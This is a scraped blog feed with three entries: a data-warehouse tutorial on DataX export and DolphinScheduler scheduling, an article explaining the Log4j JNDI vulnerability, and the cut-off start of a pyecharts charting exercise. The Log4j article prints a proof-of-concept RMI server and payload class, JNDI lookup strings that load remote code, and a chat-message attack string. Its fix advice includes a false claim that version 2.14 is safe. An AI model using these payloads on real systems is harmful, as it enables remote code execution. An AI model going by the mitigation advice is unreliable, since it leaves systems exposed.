/opt/module/datax/job/export/gmall_report.ads_page_path.json<br>/warehouse/gmall/ads/ads_page_path</p><p>;;</p><p>“ads_repeat_purchase_by_tm”)</p><p>export_data<br>/opt/module/datax/job/export/gmall_report.ads_repeat_purchase_by_tm.json<br>/warehouse/gmall/ads/ads_repeat_purchase_by_tm</p><p>;;</p><p>“ads_trade_stats”)</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_trade_stats.json<br>/warehouse/gmall/ads/ads_trade_stats</p><p>;;</p><p>“ads_trade_stats_by_cate”)</p><p>export_data<br>/opt/module/datax/job/export/gmall_report.ads_trade_stats_by_cate.json<br>/warehouse/gmall/ads/ads_trade_stats_by_cate</p><p>;;</p><p>“ads_trade_stats_by_tm”)</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_trade_stats_by_tm.json<br>/warehouse/gmall/ads/ads_trade_stats_by_tm</p><p>;;</p><p>“ads_traffic_stats_by_channel”)</p><p>export_data<br>/opt/module/datax/job/export/gmall_report.ads_traffic_stats_by_channel.json<br>/warehouse/gmall/ads/ads_traffic_stats_by_channel</p><p>;;</p><p>“ads_user_action”)</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_user_action.json<br>/warehouse/gmall/ads/ads_user_action</p><p>;;</p><p>“ads_user_change”)</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_user_change.json<br>/warehouse/gmall/ads/ads_user_change</p><p>;;</p><p>“ads_user_retention”)</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_user_retention.json<br>/warehouse/gmall/ads/ads_user_retention</p><p>;;</p><p>“ads_user_stats”)</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_user_stats.json<br>/warehouse/gmall/ads/ads_user_stats</p><p>;;</p><p>“ads_activity_stats”)</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_activity_stats.json<br>/warehouse/gmall/ads/ads_activity_stats</p><p>;;</p><p>“ads_coupon_stats”)</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_coupon_stats.json<br>/warehouse/gmall/ads/ads_coupon_stats</p><p>;;</p><p>“ads_sku_cart_num_top3_by_cate”)</p><p>export_data<br>/opt/module/datax/job/export/gmall_report.ads_sku_cart_num_top3_by_cate.json<br>/warehouse/gmall/ads/ads_sku_cart_num_top3_by_cate</p><p>;;</p><p>“all”)</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_new_buyer_stats.json<br>/warehouse/gmall/ads/ads_new_buyer_stats</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_order_by_province.json<br>/warehouse/gmall/ads/ads_order_by_province</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_page_path.json<br>/warehouse/gmall/ads/ads_page_path</p><p>export_data<br>/opt/module/datax/job/export/gmall_report.ads_repeat_purchase_by_tm.json<br>/warehouse/gmall/ads/ads_repeat_purchase_by_tm</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_trade_stats.json<br>/warehouse/gmall/ads/ads_trade_stats</p><p>export_data<br>/opt/module/datax/job/export/gmall_report.ads_trade_stats_by_cate.json<br>/warehouse/gmall/ads/ads_trade_stats_by_cate</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_trade_stats_by_tm.json<br>/warehouse/gmall/ads/ads_trade_stats_by_tm</p><p>export_data<br>/opt/module/datax/job/export/gmall_report.ads_traffic_stats_by_channel.json<br>/warehouse/gmall/ads/ads_traffic_stats_by_channel</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_user_action.json<br>/warehouse/gmall/ads/ads_user_action</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_user_change.json<br>/warehouse/gmall/ads/ads_user_change</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_user_retention.json<br>/warehouse/gmall/ads/ads_user_retention</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_user_stats.json<br>/warehouse/gmall/ads/ads_user_stats</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_activity_stats.json<br>/warehouse/gmall/ads/ads_activity_stats</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_coupon_stats.json<br>/warehouse/gmall/ads/ads_coupon_stats</p><p>export_data<br>/opt/module/datax/job/export/gmall_report.ads_sku_cart_num_top3_by_cate.json<br>/warehouse/gmall/ads/ads_sku_cart_num_top3_by_cate</p><p>;;</p><p>esac</p><p>（3）增加脚本执行权限</p><p>[atguigu@hadoop102 bin]$ chmod +x hdfs_to_mysql.sh</p><p>（4）脚本用法</p><p>[atguigu@hadoop102 bin]$ hdfs_to_mysql.sh all</p><h2 id="第13章-数据仓库工作流调度"><a href="#第13章-数据仓库工作流调度" class="headerlink" title="第13章 数据仓库工作流调度"></a>第13章 数据仓库工作流调度</h2><h3 id="调度工具部署"><a href="#调度工具部署" class="headerlink" title="调度工具部署"></a>调度工具部署</h3><h3 id="新数据生成"><a href="#新数据生成" class="headerlink" title="新数据生成"></a>新数据生成</h3><h4 id="用户行为日志"><a href="#用户行为日志" class="headerlink" title="用户行为日志"></a>用户行为日志</h4><p><strong>1）启动日志采集通道，包括Kafka、Flume等</strong></p><p><strong>（1）启动Zookeeper</strong></p><p>[atguigu@hadoop102 ~]$ zk.sh start</p><p><strong>（2）启动Kafka</strong></p><p>[atguigu@hadoop102 ~]$ kf.sh start</p><p><strong>（3）启动Flume</strong></p><p>[atguigu@hadoop102 ~]$ f1.sh start</p><p>[atguigu@hadoop102 ~]$ f2.sh start</p><p><strong>2）修改日志模拟器配置文件</strong></p><p>修改hadoop102和hadoop103两台节点中的/opt/module/applog/application.yml文件，修改mock.date参数如下</p><p>mock.date: “2020-06-15”</p><p><strong>3）执行日志生成脚本</strong></p><p>[atguigu@hadoop102 ~]$ lg.sh</p><p><strong>4）观察HDFS上是否有2020-06-15的日志数据生成</strong></p><h4 id="业务数据"><a href="#业务数据" class="headerlink" title="业务数据"></a>业务数据</h4><p><strong>1）修改Maxwell配置文件</strong></p><p><strong>（1）修改/opt/module/maxwell/config.properties文件</strong></p><p>[atguigu@hadoop102 maxwell]$ vim /opt/module/maxwell/config.properties</p><p><strong>（2）修改mock_date参数设置如下</strong></p><p>mock_date=2020-06-15</p><p><strong>2）启动增量表采集通道，包括Maxwel、Kafka、Flume等</strong></p><p><strong>（1）启动Maxwell</strong></p><p>[atguigu@hadoop102 ~]$ mxw.sh start</p><p><strong>注：若Maxwell当前正在运行，为确保上述mock参数生效，需重启Maxwell。</strong></p><p><strong>（2）启动Flume</strong></p><p>[atguigu@hadoop102 ~]$ f3.sh start</p><p><strong>3）修改业务数据模拟器配置文件中的mock_date参数</strong></p><p>mock.date=2020-06-15</p><p><strong>4）执行业务数据生成命令</strong></p><p>[atguigu@hadoop102 db_log]$ java -jar gmall2020-mock-db-2021-10-10.jar</p><p><strong>5）观察HDFS上增量表是否有2020-06-15的数据生成</strong></p><h3 id="工作流调度实操"><a href="#工作流调度实操" class="headerlink" title="工作流调度实操"></a>工作流调度实操</h3><p>由于DolphinScheduler集群模式启动进程较多，对虚拟机内存要求较高。故下面提供两种方式，可根据虚拟机内存情况进行选择。</p><h4 id="DolphinScheduler集群模式"><a href="#DolphinScheduler集群模式" class="headerlink" title="DolphinScheduler集群模式"></a>DolphinScheduler集群模式</h4><p><strong>1）启动DolphinScheduler</strong></p><p>[atguigu@hadoop102 dolphinscheduler]$ bin/start-all.sh</p><p><strong>2）使用普通用户登录</strong></p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/1481d8f1ba008676e566cbdc2500fd15.png" alt="图形用户界面, 应用程序描述已自动生成"></p><p><strong>3）向DolphinScheduler资源中心上传工作流所需脚本</strong></p><p><strong>（1）创建文件夹</strong></p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/a60dc4b0a470a68579f0bda2ccd3a72a.png" alt="图形用户界面, 应用程序描述已自动生成"></p><p><strong>（2）上传工作流所需脚本</strong></p><p>将工作流所需的所有脚本上传到资源中心scripts路径下，结果如下</p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/e6a8173a7ca62fe509ba8b7fe07bc45e.png" alt="图形用户界面, 应用程序描述已自动生成"></p><p><strong>4）向DolphinScheduler的WorkerServer节点分发脚本依赖的组件</strong></p><p>由于工作流要执行的脚本需要调用Hive、DataX等组件，故在DolphinScheduler的集群模式下，需要确保每个WorkerServer节点都有脚本所依赖的组件。</p><p>[atguigu@hadoop102 ~]$ xsync /opt/module/hive/</p><p>[atguigu@hadoop102 ~]$ xsync /opt/module/spark/</p><p>[atguigu@hadoop102 ~]$ xsync /opt/module/datax/</p><p><strong>5）修改DolphinScheduler环境变量配置文件并分发</strong></p><p><strong>（1）修改/opt/module/dolphinscheduler/conf/env/dolphinscheduler_env.sh文件</strong></p><p>[atguigu@hadoop102 ~]$ vim<br>/opt/module/dolphinscheduler/conf/env/dolphinscheduler_env.sh</p><p><strong>（2）修改内容如下</strong></p><p><strong>export HADOOP_HOME=/opt/module/hadoop-3.1.3</strong></p><p><strong>export HADOOP_CONF_DIR=/opt/module/hadoop-3.1.3/etc/hadoop</strong></p><p><strong>export SPARK_HOME=/opt/module/spark</strong></p><p>export SPARK_HOME2=/opt/soft/spark2</p><p>export PYTHON_HOME=/opt/soft/python</p><p><strong>export JAVA_HOME=/opt/module/jdk1.8.0_212</strong></p><p><strong>export HIVE_HOME=/opt/module/hive</strong></p><p>export FLINK_HOME=/opt/soft/flink</p><p><strong>export DATAX_HOME=/opt/module/datax</strong></p><p>export<br>PATH=$HADOOP_HOME/bin:$SPARK_HOME1/bin:$SPARK_HOME2/bin:$PYTHON_HOME:$JAVA_HOME/bin:$HIVE_HOME/bin:$FLINK_HOME/bin:$DATAX_HOME/bin:$PATH</p><p><strong>（3）分发文件</strong></p><p>[atguigu@hadoop102 ~]$ xsync<br>/opt/module/dolphinscheduler/conf/env/dolphinscheduler_env.sh</p><p><strong>6）创建工作流</strong></p><p><strong>（1）在gmall项目下创建工作流</strong></p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/d9fc3d70a9ffeb2779c9ddf2606ec9c6.png" alt="图形用户界面, 文本, 应用程序, 电子邮件描述已自动生成"></p><p><strong>（2）各任务节点配置如下</strong></p><p>mysql_to_hdfs_full</p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/69e0cb43ad0c3fb4a489714786c83698.png" alt="图形用户界面 描述已自动生成"></p><p>hdfs_to_ods_db</p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/83911dcf800a2eb193f3065fbf1b9b34.png" alt="图形用户界面, 网站 描述已自动生成"></p><p>hdfs_to_ods_log</p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/8bb4060781485c522894d2ebc62f1635.png" alt="图形用户界面 描述已自动生成"></p><p>ods_to_dwd</p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/b4e4a357d08b7bab51f62e65ff38be78.png" alt="图形用户界面, 应用程序描述已自动生成"></p><p>ods_to_dim</p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/cf3545948699c57f70046ea24e7624fb.png"></p><p>dwd_to_dws_1d</p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/7b73a75923f13e3f26143924e2d2c855.png" alt="图形用户界面, 应用程序描述已自动生成"></p><p>dws_1d_to_dws_nd</p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/3a75dd2406a506dce545ffd66d2edbf6.png" alt="图形用户界面 描述已自动生成"></p><p>dws_1d_to_dws_td</p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/f55099f34de24da6434f1b64abc7284d.png" alt="图形用户界面 描述已自动生成"></p><p>dws_to_ads</p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/48e17699e7ca2b90fedbdff780114ef2.png" alt="图形用户界面 描述已自动生成"></p><p>hdfs_to_mysql</p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/b836f074cb3cd97aea4180eba5dacc43.png" alt="图形用户界面 描述已自动生成"></p><p><strong>（3）各节点依赖关系如下</strong></p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/939d849431ec54a97b617843bcd93c95.png" alt="图片包含 图形用户界面描述已自动生成"></p><p><strong>（4）保存工作流</strong></p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/af6fdf3719f3d409433799762e1b7303.png" alt="图形用户界面, 应用程序描述已自动生成"></p><p><strong>注：定时调度时，全局参数值应设置为$[yyyy-MM-dd-1]或者空值。</strong></p><p><strong>7）上线工作流</strong></p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/a9955ba5c3df2b063d8887cc3e7533e7.png" alt="图形用户界面, 文本, 应用程序, 电子邮件描述已自动生成"></p><p><strong>8）执行工作流</strong></p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/676ee75ef892f2de4bebaa09a8f68562.png" alt="图形用户界面, 文本, 应用程序, 电子邮件描述已自动生成"></p><h4 id="DolphinScheduler单机模式"><a href="#DolphinScheduler单机模式" class="headerlink" title="DolphinScheduler单机模式"></a>DolphinScheduler单机模式</h4><p><strong>1）启动DolphinScheduler</strong></p><p>[atguigu@hadoop102 dolphinscheduler]$ bin/dolphinscheduler-daemon.sh start<br>standalone-server</p><p><strong>2）安全中心配置</strong></p><p>由于DolphinScheduler的单机模式使用的是内置的ZK和数据库，故在集群模式下所做的相关配置在单机模式下并不可见，所以需要重新配置，必要的配置为创建租户和创建用户。</p><p><strong>（1）使用管理员用户登录</strong></p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/1481d8f1ba008676e566cbdc2500fd15.png" alt="图形用户界面, 应用程序描述已自动生成"></p><p><strong>（2）创建租户</strong></p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/0a674653cabbac1345075a5875dd95f7.png" alt="图形用户界面 描述已自动生成"></p><p><strong>（3）创建用户</strong></p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/bda9944d222b47200b691e3cf2657388.png" alt="手机屏幕截图 描述已自动生成"></p><p><strong>3）切换普通用户登录</strong></p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/1481d8f1ba008676e566cbdc2500fd15.png" alt="图形用户界面, 应用程序描述已自动生成"></p><p><strong>4）创建项目</strong></p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/ab622546c77763b07184f0dcbf1afc28.png" alt="图形用户界面, 网站 描述已自动生成"></p><p><strong>5）其余操作</strong></p><p>其余操作与集群模式基本一致，其中分发Hive、Spark、DataX这一步可以省略。</p>]]></content>
      
      
      <categories>
          
          <category> 项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据仓库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Log4j漏洞解析</title>
      <link href="/2021/12/21/Log4j%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/"/>
      <url>/2021/12/21/Log4j%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>相信大家都知道这两天 log4j 一个超大漏洞闹得全网都沸沸扬扬，大多数跟 Java 有关的服务目前基本都处于维护状态。但目前的媒体只是在描述它的危害性，并没有深入探讨。所以今天我来给大家作一个较全面的介绍。<br>​</p><h2 id="什么是-log4j-？（资深-Java-玩家请跳过）"><a href="#什么是-log4j-？（资深-Java-玩家请跳过）" class="headerlink" title="什么是 log4j ？（资深 Java 玩家请跳过）"></a>什么是 log4j ？（资深 Java 玩家请跳过）</h2><p>​</p><p>     log4j 是 Java 的一款优秀日志框架，目前是 Java 行业内产品的标配，几乎每个 Java 服务都使用了 log4j。简单来说就是打印和存储服务器运行时产生的报告和报错等。<br>​</p><h2 id="哪里来的漏洞？"><a href="#哪里来的漏洞？" class="headerlink" title="哪里来的漏洞？"></a>哪里来的漏洞？</h2><p>​</p><p>     log4j 内提供了一些占位符替换机制，如以下代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logger.info(<span class="string">&quot;os: $&#123;java:os&#125;&quot;</span>);</span><br></pre></td></tr></table></figure><p>     输出的结果是 “os: Windows 10” (具体输出会更复杂，在这里简略了) 而不是 “os: ${java:os}”。也就是把 ${java:os} 替换成了 System.getProperties(“os”) 也就是 “Windows 10”。这个很好理解，但离谱的是 log4j 还提供了关于 jndi 的占位符。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logger.info(<span class="string">&quot;$&#123;jndi:rmi//127.0.0.1:1099/heike&#125;&quot;</span>) </span><br></pre></td></tr></table></figure><p>     jndi 是什么？说简单的就是几个 Java 程序互相交换信息的一种技术，因为这些 Java 程序都在同一个 JVM 虚拟机上运行。而 jndi 交换信息有很多种格式，上文代码中的 “rmi” 就是其中之一，你可以将它理解为 http 地址。总而言之，就是可以使两个 Java 程序互相搞小动作的东西。<br>​</p><p>     言归正传，当你执行上文代码时，log4j会自动加载通过 jndi 从远程服务器获取的 java 对象。远程服务器的地址即 “rmi//127.0.0.1:1099”，而提供的对象则是 “heike”，”heike” 一般是一个Java Class。也就是说，只要你的日志里面包含 “${jndi:rmi//127.0.0.1:1099/heike}” 这一段信息，你就可能会被黑客入侵，是不是有点 sql 注入的味道了？例如我的世界也使用了 log4j，他会用 log4j 把其他玩家说的话通过 logger.info(玩家说的话) 记录下来，如果他说了一些可以触发 log4j 占位符机制且不怀好意的话，所有听到这句话的玩家都得中招，运行远程服务器上的 Java 代码。<br>​</p><p>    我这么说可能有点绕了，所以各位资深 Java 玩家可以直接看具体代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Log4jServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException </span>&#123;</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry();</span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">&quot;me.faintcloudy.Heike&quot;</span>, <span class="string">&quot;me.faintcloudy.Heike&quot;</span>, <span class="string">&quot;http://127.0.0.1:1010/&quot;</span>);</span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;heike&quot;</span>, refObjWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Log4jServer.class (服务端, 黑客)</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Heike</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> &#123;</span><br><span class="line">    JOptionPane.showConfirmDialog(<span class="keyword">null</span>, <span class="string">&quot;你的电脑已经被我入侵了！！！&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Heike.class (服务端, 黑客)<br>​</p><p>    以上是黑客服务器上运行的代码。所以只需要你电脑上某个 Java 程序运行以下代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String log = <span class="string">&quot;$&#123;jndi:rmi//127.0.0.1:1099/heike&#125;&quot;</span>;</span><br><span class="line">logger.info(log);</span><br></pre></td></tr></table></figure><p>    此处的 “log” 可以是玩家说的话，昵称等，不需要程序特定这么写。<br>​</p><p>    就会出现如下状况:<br><img src="http://106.12.125.218/medias/medias/Log4j%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/0.png"><br>被黑客入侵 (执行了 Heike.class)<br>​</p><p>    这仅仅是打开了一个信息框，但实际上黑客可以往 Heike.class 放任何代码，在不经意间使你的电脑报废或所有账号全被偷走。</p><h3 id="我的世界JAVA版攻击"><a href="#我的世界JAVA版攻击" class="headerlink" title="我的世界JAVA版攻击"></a>我的世界JAVA版攻击</h3><p>特别是我的世界JAVA版本中，攻击方法超级简单，在游戏的在线聊天中，发送一条带漏洞触发指令的消息，类似<br>“${jndi:ldap://{}.<a href="http://xxxxxxxxxxxxxx}”,就可以对收到这条消息的用户发起攻击./">http://xxxxxxxxxxxxxx}”,就可以对收到这条消息的用户发起攻击。</a></p><h2 id="如何解决？"><a href="#如何解决？" class="headerlink" title="如何解决？"></a>如何解决？</h2><p>​</p><p>    先不要慌，如果你使用了 Java 8 或以上版本，基本对你没有什么危害。因为在 Java 8 中添加了一个新的属性 com.sun.jndi.rmi.object.trustURLCodebase，这是一个 boolean 类型。默认值是 false，在使用 jndi 时会抛出一个报错阻止加载远程服务器提供的代码。当然最好还是做一下防备，毕竟谁也说不准呢。<br>​</p><ul><li>     添加 jvm 参数 -Dlog4j2.FORMATMsgNoLookups=true，他的作用是不让 log4j 替换占位符</li><li>     创建 “log4j2.component.properties” 文件，文件中加入”log4j2.formatMsgNoLookups=true”</li><li>     删除 log4j-core-*.jar 中 org/apache/logging/log4j/core/lookup/JndiLookup.class 这个文件，彻底进行不了 jndi</li><li>     更新 log4j 到最新版本 2.14 及以上</li><li>     最最最彻底: 断网<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2>​</li></ul><p>    本人资历有限，文章中多有错误与不足，希望各位大佬多多提出建议与意见。感谢大家的支持，还请留下一个小小的转发。<br>​</p><p>    完。</p><blockquote><p> 作者：FaintCloudy <a href="https://www.bilibili.com/read/cv14380391">https://www.bilibili.com/read/cv14380391</a><br> 作者:  老斜聊科技   <a href="https://baijiahao.baidu.com/s?id=1718941062294956461&wfr=spider&for=pc">https://baijiahao.baidu.com/s?id=1718941062294956461&amp;wfr=spider&amp;for=pc</a></p></blockquote><p><a href="https://baijiahao.baidu.com/s?id=1718941062294956461&wfr=spider&for=pc"></a></p>]]></content>
      
      
      <categories>
          
          <category> INTERESTING </category>
          
      </categories>
      
      
        <tags>
            
            <tag> interesting </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>和鲸训练营-商业数据可视化</title>
      <link href="/2021/12/04/%E5%92%8C%E9%B2%B8%E8%AE%AD%E7%BB%83%E8%90%A5-%E5%95%86%E4%B8%9A%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96/"/>
      <url>/2021/12/04/%E5%92%8C%E9%B2%B8%E8%AE%AD%E7%BB%83%E8%90%A5-%E5%95%86%E4%B8%9A%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">x_data = [<span class="string">&#x27;2021-08-01&#x27;</span>, <span class="string">&#x27;2021-08-02&#x27;</span>, <span class="string">&#x27;2021-08-03&#x27;</span>, <span class="string">&#x27;2021-08-04&#x27;</span>, <span class="string">&#x27;2021-08-05&#x27;</span>, <span class="string">&#x27;2021-08-06&#x27;</span>, <span class="string">&#x27;2021-08-07&#x27;</span>, <span class="string">&#x27;2021-08-08&#x27;</span>, <span class="string">&#x27;2021-08-09&#x27;</span>, </span><br><span class="line">          <span class="string">&#x27;2021-08-10&#x27;</span>, <span class="string">&#x27;2021-08-11&#x27;</span>, <span class="string">&#x27;2021-08-12&#x27;</span>, <span class="string">&#x27;2021-08-13&#x27;</span>, <span class="string">&#x27;2021-08-14&#x27;</span>, <span class="string">&#x27;2021-08-15&#x27;</span>, <span class="string">&#x27;2021-08-16&#x27;</span>, <span class="string">&#x27;2021-08-17&#x27;</span>, <span class="string">&#x27;2021-08-18&#x27;</span>, </span><br><span class="line">          <span class="string">&#x27;2021-08-19&#x27;</span>, <span class="string">&#x27;2021-08-20&#x27;</span>, <span class="string">&#x27;2021-08-21&#x27;</span>, <span class="string">&#x27;2021-08-22&#x27;</span>, <span class="string">&#x27;2021-08-23&#x27;</span>, <span class="string">&#x27;2021-08-24&#x27;</span>, <span class="string">&#x27;2021-08-25&#x27;</span>, <span class="string">&#x27;2021-08-26&#x27;</span>, <span class="string">&#x27;2021-08-27&#x27;</span>, </span><br><span class="line">          <span class="string">&#x27;2021-08-28&#x27;</span>, <span class="string">&#x27;2021-08-29&#x27;</span>, <span class="string">&#x27;2021-08-30&#x27;</span>, <span class="string">&#x27;2021-08-31&#x27;</span>]</span><br><span class="line"><span class="comment"># 系列1的数据</span></span><br><span class="line">y_data_1 = [<span class="number">71</span>, <span class="number">77</span>, <span class="number">79</span>, <span class="number">110</span>, <span class="number">61</span>, <span class="number">104</span>, <span class="number">107</span>, <span class="number">118</span>, <span class="number">71</span>, <span class="number">61</span>, <span class="number">112</span>, <span class="number">61</span>, <span class="number">87</span>, <span class="number">55</span>, <span class="number">106</span>, <span class="number">62</span>, <span class="number">116</span>, <span class="number">102</span>, <span class="number">64</span>, <span class="number">69</span>, <span class="number">78</span>, <span class="number">56</span>, <span class="number">65</span>, <span class="number">77</span>, <span class="number">87</span>, <span class="number">117</span>, <span class="number">119</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">81</span>, <span class="number">79</span>]</span><br><span class="line"><span class="comment"># 系列2的数据</span></span><br><span class="line">y_data_2 = [<span class="number">22</span>, <span class="number">18</span>, <span class="number">48</span>, <span class="number">18</span>, <span class="number">27</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">29</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">22</span>, <span class="number">4</span>, <span class="number">36</span>, <span class="number">46</span>, <span class="number">35</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">3</span>, <span class="number">48</span>, <span class="number">72</span>, <span class="number">39</span>, <span class="number">80</span>, <span class="number">44</span>]</span><br><span class="line"><span class="comment"># 新建一个Line实例，命名为chart</span></span><br><span class="line">chart = Line()</span><br><span class="line"></span><br><span class="line">chart.set_global_opts(</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    legend_opts=opts.LegendOpts(</span><br><span class="line">        selected_mode=<span class="string">&#x27;multiple&#x27;</span>,  <span class="comment"># 设置为单选，多选=&gt;multiple</span></span><br><span class="line">        pos_right=<span class="string">&#x27;10%&#x27;</span>,  <span class="comment"># 距离右边界距离</span></span><br><span class="line">        pos_top=<span class="string">&#x27;2%&#x27;</span>,  <span class="comment"># 距离上边界的距离</span></span><br><span class="line">        <span class="comment"># orient=&#x27;vertical&#x27;,  # 设置诶垂直布局，默认水平布局=&gt;horizontal</span></span><br><span class="line">        legend_icon=<span class="string">&#x27;circle&#x27;</span>,  